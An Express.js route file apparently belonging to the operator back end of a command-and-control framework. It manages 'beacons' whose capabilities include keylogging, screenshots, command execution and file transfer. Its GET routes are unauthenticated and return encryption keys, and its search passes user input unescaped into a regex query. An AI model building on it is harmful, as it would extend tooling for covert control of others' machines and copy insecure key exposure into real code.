const express = require('express');
const Joi = require('joi');
const crypto = require('crypto');
const Beacon = require('../models/Beacon');
const Agent = require('../models/Agent');
const { requireRole } = require('../middleware/auth');

const router = express.Router();

// Validation schemas
const beaconSchema = Joi.object({
  name: Joi.string().trim().max(100).required(),
  description: Joi.string().trim().max(500).optional(),
  location: Joi.object({
    latitude: Joi.number().min(-90).max(90).required(),
    longitude: Joi.number().min(-180).max(180).required(),
    address: Joi.string().trim().optional()
  }).required(),
  type: Joi.string().valid('command', 'relay', 'monitoring', 'emergency').default('command'),
  capabilities: Joi.array().items(
    Joi.string().valid('command_execution', 'file_transfer', 'screenshot', 'keylog', 'network_scan', 'system_info')
  ).default([]),
  heartbeatInterval: Joi.number().min(5000).max(300000).default(30000)
});

// Get all beacons
router.get('/', async (req, res) => {
  try {
    const { status, type, page = 1, limit = 10, search } = req.query;
    
    const query = {};
    if (status) query.status = status;
    if (type) query.type = type;
    if (search) {
      query.$or = [
        { name: { $regex: search, $options: 'i' } },
        { description: { $regex: search, $options: 'i' } },
        { beaconId: { $regex: search, $options: 'i' } }
      ];
    }

    const beacons = await Beacon.find(query)
      .sort({ createdAt: -1 })
      .limit(limit * 1)
      .skip((page - 1) * limit)
      .populate('agents', 'agentId name status lastSeen');

    const total = await Beacon.countDocuments(query);

    res.json({
      beacons,
      pagination: {
        current: parseInt(page),
        pages: Math.ceil(total / limit),
        total
      }
    });
  } catch (error) {
    console.error('Get beacons error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get single beacon
router.get('/:id', async (req, res) => {
  try {
    const beacon = await Beacon.findById(req.params.id)
      .populate('agents', 'agentId name status lastSeen systemInfo');
    
    if (!beacon) {
      return res.status(404).json({ error: 'Beacon not found' });
    }

    res.json({ beacon });
  } catch (error) {
    console.error('Get beacon error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create new beacon
router.post('/', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const { error, value } = beaconSchema.validate(req.body);
    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    // Generate unique beacon ID and encryption key
    const beaconId = `BEACON_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const encryptionKey = crypto.randomBytes(32).toString('hex');

    const beacon = new Beacon({
      ...value,
      beaconId,
      encryptionKey
    });

    await beacon.save();

    res.status(201).json({
      message: 'Beacon created successfully',
      beacon
    });
  } catch (error) {
    console.error('Create beacon error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update beacon
router.put('/:id', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const { error, value } = beaconSchema.validate(req.body);
    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const beacon = await Beacon.findByIdAndUpdate(
      req.params.id,
      value,
      { new: true, runValidators: true }
    );

    if (!beacon) {
      return res.status(404).json({ error: 'Beacon not found' });
    }

    res.json({
      message: 'Beacon updated successfully',
      beacon
    });
  } catch (error) {
    console.error('Update beacon error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update beacon status
router.patch('/:id/status', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const { status } = req.body;
    
    if (!['active', 'inactive', 'maintenance', 'error'].includes(status)) {
      return res.status(400).json({ error: 'Invalid status' });
    }

    const beacon = await Beacon.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true }
    );

    if (!beacon) {
      return res.status(404).json({ error: 'Beacon not found' });
    }

    res.json({
      message: 'Beacon status updated successfully',
      beacon
    });
  } catch (error) {
    console.error('Update beacon status error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Delete beacon
router.delete('/:id', requireRole(['admin']), async (req, res) => {
  try {
    // Check if beacon has active agents
    const agentsCount = await Agent.countDocuments({ beaconId: req.params.id, isActive: true });
    
    if (agentsCount > 0) {
      return res.status(400).json({ 
        error: 'Cannot delete beacon with active agents. Deactivate agents first.' 
      });
    }

    const beacon = await Beacon.findByIdAndDelete(req.params.id);
    
    if (!beacon) {
      return res.status(404).json({ error: 'Beacon not found' });
    }

    res.json({ message: 'Beacon deleted successfully' });
  } catch (error) {
    console.error('Delete beacon error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get beacon statistics
router.get('/:id/stats', async (req, res) => {
  try {
    const beacon = await Beacon.findById(req.params.id);
    if (!beacon) {
      return res.status(404).json({ error: 'Beacon not found' });
    }

    const agents = await Agent.find({ beaconId: req.params.id });
    const onlineAgents = agents.filter(agent => agent.status === 'online').length;
    const totalCommands = await require('../models/Command').countDocuments({ beaconId: req.params.id });
    const recentCommands = await require('../models/Command').countDocuments({
      beaconId: req.params.id,
      createdAt: { $gte: new Date(Date.now() - 24 * 60 * 60 * 1000) }
    });

    res.json({
      totalAgents: agents.length,
      onlineAgents,
      totalCommands,
      recentCommands,
      uptime: beacon.isOnline ? Date.now() - beacon.lastSeen.getTime() : 0
    });
  } catch (error) {
    console.error('Get beacon stats error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;